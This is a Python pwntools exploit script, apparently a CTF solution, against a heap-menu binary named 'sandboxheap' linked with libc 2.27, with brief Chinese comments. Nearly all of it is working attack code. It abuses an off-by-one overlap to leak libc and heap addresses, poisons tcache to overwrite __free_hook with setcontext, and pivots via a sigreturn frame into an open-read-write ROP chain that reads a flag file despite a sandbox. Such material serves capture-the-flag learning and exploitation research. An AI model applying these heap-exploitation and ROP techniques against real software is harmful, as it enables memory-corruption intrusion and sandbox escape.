from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug'
context(os = "linux", arch = "amd64")

p=process('./sandboxheap')
libc=ELF('./libc-2.27.so')
def add(index,size):
    p.sendlineafter(b'Your choice: ',b'1')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
def getcontent(content):
    realcontent=""
    for i in content:
        realcontent+=bin(i)[2:].rjust(8,'0')[::-1]
    return realcontent
def edit(index,content):
    p.sendlineafter(b'Your choice: ',b'2')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendafter(b'Content: ',getcontent(content).encode())
def overedit(index,content,type):
    p.sendlineafter(b'Your choice: ',b'2')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendafter(b'Content: ',(getcontent(content)+str(type)).encode())
def show(index):
    p.sendlineafter(b'Your choice: ',b'3')
    p.sendlineafter(b'Index: ',str(index).encode())
def free(index):
    p.sendlineafter(b'Your choice: ',b'4')
    p.sendlineafter(b'Index: ',str(index).encode())
for i in range(7):
    add(i, 0x88)  
add(7, 0x88)
add(8, 0x88)
add(9, 0x88)
add(14,0x190)
add(15,0x190)
add(10, 0x10)
for i in range(8):
    free(i)

overedit(8, b'1' * 0x80 + p64(0x120) , 0)
free(9)
# pause()
add(11, 0x98)
add(12, 0x78)

#泄露libc
show(12)
p.recvuntil(b'Content: ')
libc_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("libc_addr: ",hex(libc_addr))
malloc_hook=libc_addr-0x70
print("malloc_hook: ",hex(malloc_hook))
libc_base=malloc_hook-libc.sym['__malloc_hook']
print("libc_base: ",hex(libc_base))
setcontext=malloc_hook-0x399be0
print("setcontext: ",hex(setcontext))
free_hook=libc_base+libc.sym['__free_hook']
print("free_hook: ",hex(free_hook))

leave_ret=libc_base+0x00000000000547e3
pop_rax=libc_base+0x000000000001b500
pop_rdi=libc_base+0x000000000002164f
pop_rbp=libc_base+0x00000000000213e3
pop_rsi=libc_base+0x0000000000023a6a
pop_rdx=libc_base+0x0000000000001b96
syscall=libc_base + 0x00000000000d2625 #hex(libc.search(asm('syscall \n ret')).__next__())，不知道为什么用ROPgadget没法找到，只能用python
read_addr=libc_base+libc.symbols['read']
open_addr=libc_base+libc.symbols['open']
write_addr=libc_base+libc.symbols['write']
#泄露堆地址
add(0, 0x88)
edit(8,b'1'*8+p64(0x91))
free(12)
edit(8,b'1'*16)
show(8)
p.recvuntil(b'Content: ')
p.recvuntil(b'1'*16)
heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("heap_addr: ",hex(heap_addr))
edit(8,p64(0)+p64(91)+p64(free_hook))
# gdb.attach(p)
add(1, 0x88)
# pause()
add(2, 0x88)
edit(2,p64(setcontext+53))

frame = SigreturnFrame()
frame.rsp=heap_addr+0x2d0
frame.rdi = 0
frame.rsi = heap_addr + 0x2d0
frame.rdx = 0x200
frame.rbp=heap_addr+0x2d0
frame.rip = leave_ret
# edit()
byte_frame=bytes(frame)
print(byte_frame ,len(byte_frame),type(byte_frame))
gdb.attach(p,'b free')
edit(1,b'./flag\x00')
#下面两种方法得到orwrop链都可以
if 1==0:
    orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
    orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,read_addr])
    orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,write_addr])
else:
    orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,pop_rax,2,syscall])
    orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,pop_rax,0,syscall])
    orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x20,pop_rax,1,syscall])
edit(14,orw_payload)
edit(15,byte_frame)
free(15)
p.interactive()
